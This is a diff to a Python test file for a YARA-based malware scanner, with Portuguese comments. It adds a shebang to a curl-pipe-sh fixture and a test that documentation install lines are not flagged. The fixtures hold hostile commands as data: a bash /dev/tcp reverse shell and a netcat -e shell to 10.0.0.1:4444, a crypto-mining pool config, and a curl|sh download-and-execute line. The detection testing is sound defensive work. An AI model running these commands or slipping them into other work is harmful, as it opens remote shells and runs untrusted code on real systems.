@@ -10,7 +10,7 @@ from guardiao import regras_yara, scanner
 REVERSE_SHELL = "".join(["#!/bin/bash\nbash -i >& /dev/", "tcp/10.0.0.1/4444 0>&1\n"])
 NETCAT = "".join(["nc 10.0.0.1 4444 -e /bin/", "sh\n"])
 MINERADOR = "".join(['{"url": "stratum+', 'tcp://pool.exemplo.com:3333", "user": "carteira"}'])
-CURL_SH = "".join(["curl -fsSL https://exemplo.com/install.sh |", " sh\n"])
+CURL_SH = "".join(["#!/bin/sh\ncurl -fsSL https://exemplo.com/install.sh |", " sh\n"])
 
 
 @pytest.fixture(scope="module")
@@ -46,6 +46,13 @@ def test_curl_pipe_sh_e_suspeito(tmp_path, yara):
     r = analisar(tmp_path, "setup.sh", CURL_SH, yara)
     assert not r.infectado and r.suspeito
     assert any("DownloadEExecuta" in m for m in r.motivos)
+
+
+def test_curl_pipe_sh_em_documentacao_nao_e_suspeito(tmp_path, yara):
+    # READMEs e manuais ensinam a instalar assim; sem "#!" não é um script.
+    texto = "## Instalação\n\n" + CURL_SH.removeprefix("#!/bin/sh\n")
+    for nome in ("README.md", "installation.html", "METADATA"):
+        assert not analisar(tmp_path, nome, texto, yara).suspeito
 
 
 def test_elf_upx_e_suspeito(tmp_path, yara):
